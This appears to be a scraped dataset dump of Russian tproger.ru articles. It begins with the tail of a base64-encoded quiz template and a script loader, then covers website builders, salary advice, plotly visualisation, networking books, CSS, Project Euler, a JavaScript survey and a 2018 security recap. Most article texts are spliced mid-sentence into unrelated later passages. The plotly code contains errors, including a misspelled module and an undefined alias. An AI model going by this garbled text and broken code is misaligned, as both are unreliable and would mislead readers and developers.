JxdWl6X2lkIiAvPgogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSdoaWRkZW4nIHZhbHVlPSc8JT0gcXVpel9qb2JfaWQgJT4nIGlkPSJxdWl6X2pvYl9pZCIgLz4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0naGlkZGVuJyB2YWx1ZT0nPCU9IHF1aXpfbiAlPicgaWQ9InF1aXpfZW1haWxfc2VuZF9uYW1lIiAvPgogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSdoaWRkZW4nIHZhbHVlPSc8JT0gcXVpel9jb21wYW55ICU+JyBpZD0icXVpel9jb21wYW55IiAvPgoJCQkJCTxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJxdWl6X2VtYWlsX2VtYWlsIiBpZD0icXVpel9lbWFpbF9lbWFpbF9pZCIgcGxhY2Vob2xkZXI9IkUtbWFpbCIgY2xhc3M9InRwX3F1aXpfZW1haWxfaW5wdXQiPgoJCQkJCTxkaXYgaWQ9InF1aXpfZW1haWxfc2VuZGluZ19idG4iIGNsYXNzPSJqb2JzX3N0YXJ0X3NraWxsc19zZWFyY2hfYnRuIj4KCQkJCQkJPHN2ZyB3aWR0aD0iMThweCIgaGVpZ2h0PSIxN3B4IiB2aWV3Qm94PSIwIDAgMjYgMTciIHZlcnNpb249IjEuMSI+CgkJCQkJCQkJCTxnIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgoJCQkJCQkJCQkJPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMS4wMDAwMDAsIDEuMDAwMDAwKSIgc3Ryb2tlPSIjNzc3IiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJzcXVhcmUiPgoJCQkJCQkJCQkJPHBhdGggZD0iTTE3LjcsMTQuMDYyNSBMMjMuNTgsNy45Mzc1Ij48L3BhdGg+CgkJCQkJCQkJCQk8cGF0aCBkPSJNMTcuNyw3LjA2MjUgTDIzLjU4LDAuOTM3NSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMjAuNjQwMDAwLCA0LjAwMDAwMCkgc2NhbGUoMSwgLTEpIHRyYW5zbGF0ZSgtMjAuNjQwMDAwLCAtNC4wMDAwMDApICI+PC9wYXRoPgoJCQkJCQkJCQkJPHBhdGggZD0iTTIzLDcuNSBMMCw3LjUiPjwvcGF0aD4KCQkJCQkJCQkJCTwvZz4KCQkJCQkJCQkJPC9nPgogICAgICAgICAgICAgICAgICAgICAgICA8L3N2Zz4KCQkJCQk8L2Rpdj4JCQoJCQkJPC9kaXY+PC9wPgogICAgICAgICAgICA8cD4KICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9InF1aXpfZW1haWxfYWdyZWUiIGNsYXNzPSJxdWl6X2VtYWlsX2FncmVlIj48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9InF1aXpfZW1haWxfYWdyZWUiIGlkPSdxdWl6X2VtYWlsX2FncmVlJyBzdHlsZT0ibWFyZ2luOjA7Ij4g0K8g0YHQvtCz0LvQsNGI0LDRjtGB0Ywg0L3QsCDQv9C10YDQtdC00LDRh9GDINC/0LXRgNGB0L7QvdCw0LvRjNC90YvRhSDQtNCw0L3QvdGL0YUg0YHQvtCz0LvQsNGB0L3QviA8YSBocmVmPSJodHRwczovL3Rwcm9nZXIucnUvd3AtY29udGVudC91cGxvYWRzL2N1c3RvbS9wcml2YWN5X3YxLnBkZiIgdGFyZ2V0PSJfYmxhbmsiPtC/0L7Qu9C40YLQuNC60LUg0LrQvtC90YTQuNC00LXQvdGG0LjQsNC70YzQvdC+0YHRgtC4PC9hPiDQuCA8YSBocmVmPSJodHRwczovL3Rwcm9nZXIucnUvd3AtY29udGVudC91cGxvYWRzL2N1c3RvbS90ZXJtc192MS5wZGYiIHRhcmdldD0iX2JsYW5rIj7Qv9C+0LvRjNC30L7QstCw0YLQtdC70YzRgdC60L7QvNGDINGB0L7Qs9C70LDRiNC10L3QuNGOPC9hPjwvbGFiZWw+CiAgICAgICAgICAgIDwvcD4KICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgPGRpdiBpZD0ncXVpel9zZW5kX2VtYWlsX2Zvcm1fYmxvY2tfYWZ0ZXInIHN0eWxlPSdkaXNwbGF5Om5vbmUnPgogICAgICAgICAgICDQodC/0LDRgdC40LHQviEg0KEg0LLQsNC80Lgg0YHQstGP0LbRg9GC0YHRjy4g0JXRgdC70Lgg0L3QsNC50LTQtdGC0YHRjyDQstGA0LXQvNGPLCDQt9Cw0L/QvtC70L3QuNGC0LUg0LggPGEgaHJlZj0iPCU9IHF1aXpfam9iX3VybCAlPiIgPtCx0L7Qu9GM0YjRg9GOINGE0L7RgNC80YMg0L7RgtC60LvQuNC60LA8L2E+INGC0L7QttC1LiDQotCw0Log0YMg0LLQsNGBINCx0YPQtNC10YIg0LHQvtC70YzRiNC1INGI0LDQvdGB0L7Qsi4KICAgIDwvZGl2PgogICAgPGRpdiBpZD0ncXVpel9zZW5kX2VtYWlsX2Zvcm1fYmxvY2tfYWZ0ZXJfaWZfc2VuZCcgc3R5bGU9J2Rpc3BsYXk6bm9uZSc+CiAgICAgICAg0JLRiyDRg9C20LUg0L7RgdGC0LDQstC40LvQuCDRgdCy0L7QuSBlLW1haWwuINCf0L7RgdC80L7RgtGA0LjRgtC1IDxhIGhyZWY9IjwlPSBxdWl6X2pvYl91cmxfdG9fam9iICU+Ij7RgdCw0LzRgyDQstCw0LrQsNC90YHQuNGOPC9hPiDQuCDQt9Cw0L/QvtC70L3QuNGC0LUg0LggPGEgaHJlZj0iPCU9IHF1aXpfam9iX3VybCAlPiI+0LHQvtC70YzRiNGD0Y4g0YTQvtGA0LzRgyDQvtGC0LrQu9C40LrQsDwvYT4g0YLQvtC20LUuINCi0LDQuiDRgyDQstCw0YEg0LHRg9C00LXRgiDQsdC+0LvRjNGI0LUg0YjQsNC90YHQvtCyLgogICAgPC9kaXY+CiAgICA8JSB9ICU+CiAgICA8ZGl2IGNsYXNzPSJxdWl6X3Jlc3VsdF93cmFwcGVyIj4KICAgICAgICA8YnV0dG9uIGNsYXNzPSJxdWl6X3JlZnJlc2hfYnV0dG9uIiBpZD0icmVmcmVzaF9xdWl6IiBkYXRhLXJvbGU9InJlZnJlc2hfcXVpeiI+CiAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJkYXNoaWNvbnMgZGFzaGljb25zLWltYWdlLXJvdGF0ZSI+PC9zcGFuPiDQn9C+0L/RgNC+0LHQvtCy0LDRgtGMINC10YnRkSDRgNCw0LcKICAgICAgICA8L2J1dHRvbj4KICAgCiAgICAgICAgPGRpdiBjbGFzcz0icXVpel9zaGFyZV93cmFwcGVyIj4KICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0icXVpel9zaGFyZSBxdWl6X3NoYXJlX3ZrIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCk7IiBvbmNsaWNrPSJzb2NpYWxfc2hhcmUoJ2h0dHBzOi8vdmsuY29tL3NoYXJlLnBocD91cmw9JyArIGVuY29kZVVSSSh3aW5kb3cubG9jYXRpb24uaHJlZikgKyAnJnRpdGxlPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQudGl0bGUpICsgJyZjb21tZW50PdCvINC/0YDQvtGI0ZHQuyAnICsgZW5jb2RlVVJJQ29tcG9uZW50KCc8JT0gcXVpei50aXRsZSAlPicpICsgJy4g0JzQvtC5INGA0LXQt9GD0LvRjNGC0LDRgjogPCU9IHRleHQudGl0bGUgJT4uPCU9IHRleHQuZXh0cmEgJT4maW1hZ2U9JyArIGVuY29kZVVSSSh3aW5kb3cubG9jYXRpb24ub3JpZ2luICsgJy9zaGFyZS9pbWFnZS88JT0gc2hhcmUuc2VyaWFsaXplZCAlPi5wbmcnKSk7Ij48aSBjbGFzcz0iaWNvbi12ayI+PC9pPjwvYnV0dG9uPgogICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJxdWl6X3NoYXJlIHF1aXpfc2hhcmVfZmIiIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKTsiIG9uY2xpY2s9InNvY2lhbF9zaGFyZSgnaHR0cDovL3d3dy5mYWNlYm9vay5jb20vc2hhcmVyLnBocD91PScgKyBlbmNvZGVVUklDb21wb25lbnQoKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2xpbmtbcmVsPWNhbm9uaWNhbF0nKSA/IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2xpbmtbcmVsPWNhbm9uaWNhbF0nKS5ocmVmIDogd2luZG93Ll9pb19jb25maWdbJzAuMi4wJ11bMF0ucGFnZV91cmxfY2Fub25pY2FsKSArICcvcmVzdWx0LzwlPSBxdWl6LnFpZCAlPi88JT0gcXVpei5yZXN1bHQgJT4nKSk7Ij48aSBjbGFzcz0iaWNvbi1mYWNlYm9vay0xIj48L2k+PC9idXR0b24+CiAgICAgICAgICAgIDxidXR0b24gY2xhc3M9InF1aXpfc2hhcmUgcXVpel9zaGFyZV90dyIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApOyIgb25jbGljaz0ic29jaWFsX3NoYXJlKCdodHRwOi8vdHdpdHRlci5jb20vaW50ZW50L3R3ZWV0P3VybD0nICsgZW5jb2RlVVJJKHdpbmRvdy5sb2NhdGlvbi5ocmVmKSArICcmdGV4dD3QryDQv9GA0L7RiNGR0LsgPCU9IHF1aXoudGl0bGUgJT4uINCc0L7QuSDRgNC10LfRg9C70YzRgtCw0YI6IDwlPSB0ZXh0LnRpdGxlICU+LjwlPSB0ZXh0LmV4dHJhICU+Jyk7Ij48aSBjbGFzcz0iaWNvbi10d2l0dGVyLTEiPjwvaT48L2J1dHRvbj4KICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0icXVpel9zaGFyZSBxdWl6X3NoYXJlX3RnIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCk7IiBvbmNsaWNrPSJ3aW5kb3cub3BlbigndGc6Ly9tc2dfdXJsP3RleHQ90K8g0L/RgNC+0YjRkdC7IDwlPSBxdWl6LnRpdGxlICU+LiDQnNC+0Lkg0YDQtdC30YPQu9GM0YLQsNGCOiA8JT0gdGV4dC50aXRsZSAlPi48JT0gdGV4dC5leHRyYSAlPiZ1cmw9JyArIGVuY29kZVVSSSh3aW5kb3cubG9jYXRpb24uaHJlZiksICdfc2VsZicpOyI+PGltZyBzcmM9Imh0dHBzOi8vY2RuLnRwcm9nZXIucnUvd3AtaW1hZ2VzL3RnX2hlYWRlci5wbmciPjwvYnV0dG9uPgogICAgICAgIDwvZGl2PiAgICAKICAgIDwvZGl2PgoKCjwvZGl2Pgo=')));if(quiz_data.code_mode){var head=document.head||document.getElementsByTagName('head')[0];var script=document.createElement('script');script.type='text/javascript';script.defer=true;script.src='https://cdn.tproger.ru/wp-content/themes/bliss/assets/plugins/prism/prism.js?x60988';head.appendChild(script);link=document.createElement('link');link.rel='stylesheet';link.type='text/css';link.href='https://cdn.tproger.ru/wp-content/themes/bliss/assets/plugins/prism/prism.css?x60988';head.appendChild(link);} Никита Прияцелюк, последний центурион	https://tproger.ru/quiz/lines-of-code/	107
ebb50a14-32eb-11e9-9b69-28c2dd5a952f	Создаём сайт без навыков программирования: обзор лучших конструкторов	Веб-разработка; Инструменты	По той или иной причине сайт нужен многим drop редактор.Локализация на русский язык.Обширный выбор адаптивных шаблонов.Достаточно широкие возможности для SEO-оптимизации.Доступная стоимость тарифов:Возможность создать онлайн-магазин за разумные деньги.Недостатки:Слабоватая функциональность.Отсутствует магазин приложений.Отсутствует возможность интеграции со сторонними сервисами.SITE123SITE123 существует уже около 15 лет и считается одним из самых простых и удобных конструкторов сайтов. Настраиваемые шаблоны и коллекция бесплатных графических элементов, изображений и шрифтов придутся по душе креативным людям. Бесплатный тариф включает в себя хостинг, домен, 1 ГБ трафика, 500 МБ хранилища и интеграцию с Google Analytics.ПреимуществаБесплатный тариф.Простой в использовании.Возможность создавать несколько сайтов с одного аккаунта.Множество расширений.Адаптивные шаблоны.Надёжный: быстрое время загрузки и почти 100 % аптайм.НедостаткиНедостаточно функциональный для профессиональных пользователей.Слишком простой для онлайн-магазинов.Итак, как выбрать конструктор для создания сайта без навыков программирования:Если вам нужен простой и функциональный конструктор, то попробуйте Wix.Хотите создать красивый сайт в дизайнерском формате? Вам вполне подойдёт Tilda. Однако учитывайте, что на бесплатном тарифе доступно только 50 МБ для хранения данных.Нужен интернет-магазин? Обратите внимание на Weebly и Nethouse.Если нужно создать бизнес-сайт, не прилагая много усилий, то вам может подойти uKit.Никита Прияцелюк, последний центурион Веб-разработка, Инструменты	https://tproger.ru/digest/website-builders-review/	107
ebd4f77a-32eb-11e9-9b69-28c2dd5a952f	Как отвечать работодателю на вопрос о зарплате  советы экспертов	Собеседование	Очень часто работодатель не озвучивает соискателю уровень заработной платы, а спрашивает у него желаемую цифру. Неопытные соискатели могут как занизить оценку своего труда, так и перегнуть палку. Мы спросили у экспертов, как кандидату наиболее точно оценить себя. Краткие выводы можно посмотреть внизу статьи.\n\n\n\nДарья Рудник, директор по персоналу компании  поговорить с их представителями. Ведь обратившегося к ним кандидата рекрутеры всегда стремятся продать подороже, чтобы получить комиссию с его будущей зарплаты. Но при этом они всё же не будут завышать вашу стоимость. И, скорее всего, расскажут, на какую сумму при текущей квалификации вы реально можете рассчитывать.\nРейтинг полезности ответа: 42\nПовысить\nПонизить\n\n\n\nЕкатерина Проклова, директор по персоналу компании  это воспользоваться специальными сервисами сайтов для поиска работы, которые не так давно появились и которые предлагают помочь оформить резюме и прицениться по уровню заработных плат.\nРейтинг полезности ответа: 42\nПовысить\nПонизить\n\n\n\nЕлена Федорова, HRM-директор DataArt, ВоронежРаботодателям действительно всегда сложно ответить на вопрос о заработной плате для той или иной позиции. Это связано с тем, что чаще всего разработчики владеют не только одним языком программирования или технологией повышать уровень владения английским языком и т. д.\nРейтинг полезности ответа: 42\nПовысить\nПонизить\n\n\n\nАлександра Балод, HR-директор 404 GroupЕсть только один способ не промахнуться с ожидаемой зарплатой на собеседовании  это часто ставит в тупик. Такая ситуация выглядит как игра, и победить в ней хотят обе стороны. Лучше, если вы чётко знаете сумму, ниже которой вы не готовы опускаться. Скажите об этом прямо. И не называйте суммы, которые на 70% выше того, что вы зарабатывали на прежней работе. Любая компания более-менее держит свои зарплаты на уровне рынка, и такой скачок её насторожит.\nРейтинг полезности ответа: 42\nПовысить\nПонизить\n\n\n\nЕкатерина Фирсова, HR-менеджер компании ParallelsКонечно, с ожиданиями по зарплате кандидатам надо определяться задолго до собеседования. Самый простой способ в этом случае  это обратиться за советом в хорошее кадровое агентство, так как они заинтересованы продать кандидата за максимально возможную сумму. Они смогут порекомендовать оптимальный уровень дохода и заодно сориентируют вас по вашей примерной рыночной стоимости.\nРейтинг полезности ответа: 42\nПовысить\nПонизитьИтак, как отвечать работодателю на вопрос о зарплате?Эксперты советуют использовать несколько простых пунктов:Если у вас есть знакомые в этой сфере, спросите у них про зарплату.Если их нет или они не хотят делиться информацией, то посмотрите на зарплаты вакансий со схожими требованиями. Не называйте суммы гораздо выше той, что вы зарабатывали на прежнем месте работы, если у вас оно было и вы устраиваетесь на примерно ту же должность.Наконец, с оценкой вашей стоимости могут помочь разные сервисы и кадровые агентства.Напоминаем, что вырасскажем, как это сделать. Собеседование	https://tproger.ru/experts/interview-expected-salary/	107
ebf1a6f4-32eb-11e9-9b69-28c2dd5a952f	Качественно новый уровень визуализации данных в Python	Data Science; Python; Визуализация	Рассказывает Уилл Кёрсен, data scientist в Cortex IntelНам сложно отказываться от дел, на которые мы уже потратили много времени. Поэтому мы остаёмся на нелюбимой работе, вкладываемся в проекты, которые точно не добавьте следующие импорты в блокнот Jupyter:# Стандартные импорты plotly\nimport plotly.plotly as py\nimport plotly.graph_obs as go\nfrom plotly.offline import iplot\nimport cufflinks\ncufflinks.go_offline()\n# Устанавливаем глобальную тему \ncf.set_config_file(world_readable=True, theme='pearl', offline=True)Гистограммы и бочки с усамиГрафики по одной переменной  надёжный выбор (хоть и не без изъянов) для отображения распределения. Давайте нарисуем интерактивную гистограмму количества лайков, используя статистику моих постов на Medium (df это обычный DataFrame):df['claps'].iplot(kind='hist', xTitle='claps',\n                  yTitle='count', title='Claps Distribution')Интерактивная гистограмма, созданная с помощью plotly + cufflinksЕсли вы работали с matplotlib, то вы заметили, что нам пришлось добавить всего одну букву (iplot() вместоplot()), чтобы получить гораздо более красивый и интерактивный график! Можно кликнуть на данные для получения подробностей, приблизить части графика и, как мы потом увидим, выбирать отдельные категории для просмотра.А вот так можно построить наложенные друг на друга гистограммы:df[['time_started', 'time_published']].iplot(\n    kind='hist',\n    histnorm='percent',\n    barmode='overlay',\n    xTitle='Time of Day',\n    yTitle='(%) of Articles',\n    title='Time Started and Time Published')Немного поколдовав с pandas, получим столбчатую диаграмму:# Создаём DataFrame с месячной частотой и строим график\ndf2 = df[['view','reads','published_date']].\\\n         set_index('published_date').\\\n         resample('M').mean()\ndf2.iplot(kind='bar', xTitle='Date', yTitle='Average',\n    title='Monthly Average Views and Reads')Как видите, мы можем совмещать возможности pandas и plotly + cufflinks. Для графика , который показывает количество лайкнувших каждый пост, мы сначала используем pivot(), а затем строим график:df.pivot(columns='publication', values='fans').iplot(\n        kind='box',\n        yTitle='fans',\n        title='Fans Distribution by Publication')Преимущества интерактивности заключаются в том, что мы можем исследовать данные и делать их выборки любым образом. Ящик с усами содержит много информации, большая часть которой пройдёт мимо нас, если мы не сможем видеть числа!Диаграмма рассеянияЭто, наверное, наиболее часто используемая диаграмма при анализе данных. Она позволяет увидеть изменение переменной с течением времени или отношение между двумя (или более) переменными.Временные рядыВ значительной части данных содержится информация о времени. К счастью, plotly + cufflinks были разработаны с расчётом на визуализацию временных рядов. Создадим DataFrame с моими статьями и посмотрим, как менялись тренды.# Создаём DataFrame со статьями Towards Data Science\ntds = df[df['publication'] == 'Towards Data Science'].\\\n         set_index('published_date')\n# Строим продолжительность чтения как временной ряд\ntds[['claps', 'fans', 'title']].iplot(\n    y='claps', mode='lines+markers', secondary_y = 'fans',\n    secondary_y_title='Fans', xTitle='Date', yTitle='Claps',\n    text='title', title='Fans and Claps over Time')Здесь мы в одну строку делаем сразу несколько разных вещей:Автоматически получаем красиво отформатированную ось X;Добавляем дополнительную ось Y, так как у переменных разные диапазоны;Добавляем заголовки статей, которые высвечиваются при наведении курсора.Для большей наглядности можно легко добавить текстовые аннотации:tds_monthly_totals.iplot(\n    mode='lines+markers+text',\n    text=text,\n    y='word_count',\n    opacity=0.8,\n    xTitle='Date',\n    yTitle='Word Count',\n    title='Total Word Count by Month')Диаграмма рассеяния с аннотациямиА вот так можно создать точечную диаграмму с двумя переменными, окрашенными согласно третьей категориальной переменной:df.iplot(\n    x='read_time',\n    y='read_ratio',\n    # Указываем категорию\n    categories='publication',\n    xTitle='Read Time',\n    yTitle='Reading Percent',\n    title='Reading Percent vs Read Ratio by Publication')\nСделаем график немного более сложным, используя логарифмическую ось (настраивается через аргумент layout, подробнее в документации) и установив размер пузырьков в соответствии с числовой переменной:tds.iplot(\n    x='word_count',\n    y='reads',\n    size='read_ratio',\n    text=text,\n    mode='markers',\n    # Log xaxis\n    layout=dict(\n        xaxis=dict(type='log', title='Word Count'),\n        yaxis=dict(title='Reads'),\n        title='Reads vs Log Word Count Sized by Read Ratio'))Если захотеть (подробности в блокноте), то можно уместить даже 4 переменные (не советую) на одном графике!Как и раньше, мы совмещаем возможности pandas и plotly + cufflinks для получения полезных графиков:df.pivot_table(\n    values='views', index='published_date',\n    columns='publication').cumsum().iplot(\n        mode='markers+lines',\n        size=8,\n        symbol=[1, 2, 3, 4, 5],\n        layout=dict(\n            xaxis=dict(title='Date'),\n            yaxis=dict(type='log', title='Total Views'),\n            title='Total Views over Time by Publication'))Загляните в блокнот или документацию, чтобы увидеть больше примеров добавленной функциональности. Мы можем добавить текстовые аннотации, контрольные линии и линии тренда отличный выбор, если нам нужно изучить отношения между многими переменными:import plotly.figure_factory as ff\nfigure = ff.create_scatterplotmatrix(\n    df[['claps', 'publication', 'views',      \n        'read_ratio','word_count']],\n    diag='histogram',\n    index='publication')Даже этот график полностью интерактивен, что позволяет нам исследовать данные.Корреляционная тепловая картаЧтобы отобразить взаимосвязи между числовыми переменными, сначала посчитаем коэффициенты корреляции, а затем создадим аннотированную тепловую карту:corrs = df.corr()\nfigure = ff.create_annotated_heatmap(\n    z=corrs.values,\n    x=list(corrs.columns),\n    y=list(corrs.index),\n    annotation_text=corrs.round(2).values,\n    showscale=True)Cufflinks также предлагает несколько тем, которые можно использовать для получения совершенно другого стиля, не прилагая усилий. Например, ниже можно увидеть графики с темами Никита Прияцелюк, последний центурион Data Science, Python, Визуализация	https://tproger.ru/translations/python-data-vizualization/	107
ec0f0f00-32eb-11e9-9b69-28c2dd5a952f	Подборка книг по компьютерным сетям	Сетевые протоколы	Компьютерные сети Оливьера Бонавентуры (Olivier Bonaventure) служит введением в тему компьютерных сетей. Первая часть книги содержит материал по основным концепциям, включая создание и настройку сети, адресацию, общий доступ к ресурсам и безопасность. Во второй части книги отдельно рассматриваются многие основные протоколы стека TCP/IP: HTTP, TLS, RPC, TCP, UDP, SCTP, IPv6, система доменных имён (DNS) и другое. В конце книги вы найдёте справочник по различным аббревиатурам, встречающимся в стандартах.А какими книгами по компьютерным сетям пользовались вы? Или какие книги вам рекомендовали ваши знакомые и преподаватели? Делитесь в комментариях.Алексей Грачев Сетевые протоколы	https://tproger.ru/books/computer-networks-books/	107
ec2d6b94-32eb-11e9-9b69-28c2dd5a952f	В помощь веб-разработчику: полезные проекты и инструменты для работы с Chrome DevTools	Google Chrome; Веб-разработка; Инструменты	Работу современного веб-разработчика сложно представить без вспомогательных инструментов. Один из самых популярных  интерфейс для пакета react-addons-perf.Смотрите также: Удобные возможности консоли разработчика Chrome, о которых вы можете не знатьНа основе Awesome chrome-devtoolsНикита Прияцелюк, последний центурион Google Chrome, Веб-разработка, Инструменты	https://tproger.ru/translations/chrome-devtools/	107
ec48fd96-32eb-11e9-9b69-28c2dd5a952f	Функциональный CSS: упрощаем работу со стилями	CSS	Развитие браузеров ограничивало развитие CSS. И примерно с 2015 года (когда браузеры стали поддерживать flexbox) появилась возможность применить новые технологии в приложениях и на сайтах. На помощь пришли библиотеки функциональному CSSКакой смысл писать похожий CSS-код в разных проектах? Достаточно довериться людям, которые разбираются в дизайне и сэкономить своё время, используя функциональные CSS-библиотеки. Если вам уже знакомы основы CSS, то стоит присмотреться к новой волне изменений, ведь будущее не за горами.А если хотите их знать, то читайте также:Основы CSS: блочная модельКак работает CSS Flexbox: наглядное введение в систему компоновки элементов на веб-странице Перевод статьи Simplify Styling with Functional CSSАртем Гаврилов CSS	https://tproger.ru/translations/functional-css-usage/	107
ec5ccde4-32eb-11e9-9b69-28c2dd5a952f	Проект Эйлер: задачи, которые может решить только настоящий программист	Для мотивации	Разработчику практически всегда нужно решать разнообразные задачи и нет ничего лучше, чем практика. В Проекте Эйлер есть огромное количество различных заданий, которые помогут держать свой мозг в тонусе.Особенности платформы:Задачи можно решить на любом языке программирования, и они показывают, как хорошо вы знаете базовые операции выбранного языка.Вы научитесь писать надёжный, стандартный, классический код. Никаких библиотек, так что опираться на чужой код не получится.Вам придётся думать о том, как хранить данные в памяти и получать к ним доступ.Вам предстоит оптимизировать скорость обработки и хорошо подумать над используемыми алгоритмами.Однако сначала несколько слов о самом проекте.Проект ЭйлерЭто некоммерческая площадка с набором задач по математике и программированию, которая позволяет (и зачастую требует) расширить свои знания в различных областях и просто пораскинуть мозгами.Есть задачи разного уровня сложности, поэтому каждый, если постарается, найдёт ту, с которой сможет справиться. Сложность можно приблизительно оценить по количеству пользователей, решивших задачу. Не возбраняется пользоваться поисковиками, однако авторы предупреждают, что между поиском нужной информации и копипастой чужого решения есть тонкая грань, за которую не стоит заступать Никита Прияцелюк, последний центурион Для мотивации	https://tproger.ru/translations/project-euler-for-true-devs/	107
ec75cb0a-32eb-11e9-9b69-28c2dd5a952f	StateOfJS: обзор масштабного опроса JavaScript-разработчиков по итогам 2018 года	JavaScript	В рамках State of JavaScript разработчики рассказывают, чем они пользуются, с чем им нравится работать и что они хотят изучить. В итоге получается уникальная статистика с некоторыми деталями, которые, возможно, помогут вам найти свой путь в экосистему JavaScript.В прошлом году мы любимые API:\nСреди служебных библиотек выделяются lodash и moment:А VS Code сильно впереди других текстовых редакторов: Победители гонки технологий прошедшего годаПримечание ES6 не принимал участие в этом соревновании, он слишком силён и важен для подобных затей.ВыводПохоже, что 2018 год не принёс чего-то кардинально нового Евгений Туренко, кубанский переводчик JavaScript	https://tproger.ru/articles/javascript-2018-survey/	107
ec8e3690-32eb-11e9-9b69-28c2dd5a952f	Что произошло в сфере IT-безопасности в 2018 году  утечки, атаки, майнинг и мемный хакинг	Безопасность	IT-индустрия продолжает развиваться, и 2018 год успел порадовать новыми разработками и исследованиями.CVE-2018-14847, обнаруженную в этих устройствах. Впрочем, не все владельцы оборудования оценили его усилия.Опасные мемыВ декабре любители забавных картинок получили удар в спину. Хакеры стали использовать графические мемы со скрытыми командами для управления малварью на машине жертвы. Картинки размещали на аккаунте в Twitter. Учётка уже заблокирована, однако никто не мешает хакерам создать новую. Впрочем, сами по себе эти картинки не представляют угрозы, они лишь средство связи.В целом 2018 год можно назвать годом криптомайнеров. Возросшие стоимость и популярность валют на основе блокчейна дали хакерам хороший стимул для работы в этом направлении. Монетизация навыков взлома в фиатные деньги требовала сложных манипуляций, если хакер не хотел попасться. Криптовалюты лишены этого недостатка, существуют достаточно простые способы скрыть получателя транзакций. Возможно, по этим причинам незаконная деятельность в Интернете в прошедшем году ориентировалась на кражу вычислительных ресурсов. Многие дальновидные хакеры даже ограничивали потребляемые мощности, чтобы мальварь дольше оставалась незаметной.Будьте начеку в 2k19 и оставайтесь на связи 🙂Сергей Штукатуров Безопасность	https://tproger.ru/articles/2018-cybersecurity-review/	107
ecce27d2-32eb-11e9-9b69-28c2dd5a952f	Что программист не должен был пропустить в 2018  мнение экспертов		Каждый год происходят какие-то фундаментальные события, на которые стоит обратить внимание. Мы решили спросить у экспертов, что программист не должен был пропустить в 2018 году.\n\n\n\nМаксим Киршин, тимлид команды разработки DirectumRXВ 2018 году программисту совершенно не стоило пропускать изменения компании Microsoft, а если пропустили, то скорее читайте, что там произошло.Этот год был богат на новости, связанные с Open source и Microsoft. Бурное развитие .NET Core притягивает всё больше разработчиков на свою сторону. Вот несколько новостей и релизов, на которые следует обратить внимание:Конечно же релиз .NET Core. Релизы выходят достаточно часто, на данный момент на подходе версия 3.0.Релизы ASP.NET Core и EntityFrameworkCore, в том числе и развитие полностью переписанного SignalR Core.Релиз фреймворка Orleansи WinForms.Постоянные релизы Visual Studio Code, полностью бесплатной расширяемой многоязычной среды разработки.Для тех, кто не знал, PowerShell уже давно доступен на всех системах и является кроссплатформенным.Из шокирующих, спорных и противоречивых новостей стоит отметить анонс разработки браузера Microsoft Edge на движке Chromium.Такой Microsoft мы ещё не видели 🙂И это ещё не всё….NET Foundation объявили об открытом членстве. Теперь любой желающий может стать членом фонда, а также любая компания может стать спонсором фонда. Это отличная вдохновляющая новость, которая не может не радовать. Развитие .NET будет ещё более открытым и надёжным. На эту новость особенно стоит обратить внимание тем, кто по причине бума импортозамещения мог отказаться от выбора стека Microsoft. Microsoft и .NET с нами надолго! Они открыты и готовы меняться.\nРейтинг полезности ответа: 42\nПовысить\nПонизить\n\n\n\nИлья Бирюков, frontend-лид digital-агентства RutorikaУэс Бос выпустил новый курс Advanced React 3 демки, самое время начинать!WebAssembly. Добро пожаловать в новую реальность фронтенд-разработки. В 2018 году WA окончательно избавился от младенческого пуха и впервые уверенно взмахнул крыльями. Число платформ и языков, которые в него компилируются, растёт каждый день. И даже если вы не планируете писать веб-приложения, допустим, на Erlang, всё же стоит разобраться, как загружать и запускать WA-модули.\nРейтинг полезности ответа: 42\nПовысить\nПонизить\n\n\n\nДмитрий Казаков, руководитель отдела веб-разработки RU-CENTERМне кажется, что ничего фундаментального не произошло. Ну, то есть, возможно, для кого-то скачок популярности TypeScript окажется важным трендом, но в целом же ничего особо значимого не происходило перестал быть бетой в этом году и, помимо всего прочего, научился работать с node.js. Возможно, нас ждёт рецидив эпохи универсального web-сервера. Или нет. Время покажет.\nРейтинг полезности ответа: 42\nПовысить\nПонизить\n\n\n\nКирилл Меженцев, программист группы разработки карты рассрочки Всё больший акцент идёт на процессе доставки, а не на глубине разработки. Она, конечно, важна, но time to market важнее, а вкупе с предсказуемыми процессами разработки и тестирования глубина скилла индивидуального разработчика уходит на второй план. Об этом можно судить хотя бы по тому, что далеко не только DevOps-конференции включают CI/CD в свои программы. Всё по учебникам, среда влияет на поведение. Компании стараются отстроить процессы, в которых ошибиться и вылить на прод серьёзные баги практически невозможно. И это хорошо.При этом растёт бюджет на привлечение программистов в компании. Ещё несколько лет назад сложно было представить крупное мероприятие, нацеленное исключительно на хантинг программистов и улучшение репутации компании среди сообщества. В 2018 году только ленивые не проводят в своих офисах лекции, курсы, хакатоны и митапы с брендированной раздаткой и сбором телефонов в конце мероприятия.Data Science и Machine Learning становятся мейнстримом и применяются даже в решении небольших задач. Бизнес использует их для получения инсайтов о поведении пользователей и улучшении сервисов. Возможно, именно благодаря этому Python наконец обогнал не только Java, но и JavaScript по количеству вопросов на stackoverflow.Тренды на 2019: DevOps, Data Science, Serverless, Functional Programming.\nРейтинг полезности ответа: 42\nПовысить\nПонизитьА чем вам запомнился ушедший год? Что 